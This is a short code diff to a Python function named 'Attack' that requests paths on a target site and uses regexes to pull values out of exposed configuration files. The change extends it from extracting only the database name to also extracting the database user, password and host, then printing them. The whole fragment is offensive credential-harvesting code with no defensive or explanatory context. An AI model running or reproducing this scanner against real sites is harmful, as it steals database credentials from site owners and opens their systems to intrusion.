@@ -70,7 +70,14 @@ def Attack(site):
         try:
             req = requests.get(site + i).text
             if "DB_NAME" in req:
-                print("DB_NAME: "+ str(re.findall("'DB_NAME', '(.*?)'" ,req)))
+                data = {
+                    'DB_NAME:': re.findall("'DB_NAME', '(.*?)'", req),
+                    'DB_USER:': re.findall("'DB_USER', '(.*?)'", req),
+                    'DB_PASSWORD:': re.findall("'DB_PASSWORD', '(.*?)'", req),
+                    'DB_HOST:': re.findall("'DB_HOST', '(.*?)'", req)
+                }
+                for i in data:
+                    print(i, data[i][0])
 
         except:
             pass
